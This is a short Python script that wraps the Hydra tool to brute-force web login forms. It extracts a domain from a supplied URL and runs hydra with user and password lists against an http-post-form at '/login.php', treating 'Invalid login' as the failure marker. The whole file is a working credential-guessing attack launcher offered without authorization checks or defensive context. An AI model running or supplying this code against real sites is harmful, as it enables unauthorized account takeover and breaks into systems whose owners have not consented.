import subprocess
import re

def extract_domain(url):
    """Extracts the domain from a given URL."""
    match = re.search(r"https?://([^/]+)", url)
    return match.group(1) if match else None

def run_hydra(target_url, userlist, passlist):
    """Runs Hydra brute force attack and returns the result."""
    domain = extract_domain(target_url)
    if not domain:
        return "Invalid URL format. Please enter a valid URL."

    # Define the login form path
    login_path = "/login.php"

    command = [
        "hydra", "-L", userlist, "-P", passlist, domain, "http-post-form",
        f"{login_path}:username=^USER^&password=^PASS^:Invalid login"
    ]

    try:
        result = subprocess.run(command, capture_output=True, text=True)
        return result.stdout
    except FileNotFoundError:
        return "Hydra is not installed. Install it using: sudo apt install hydra"
  
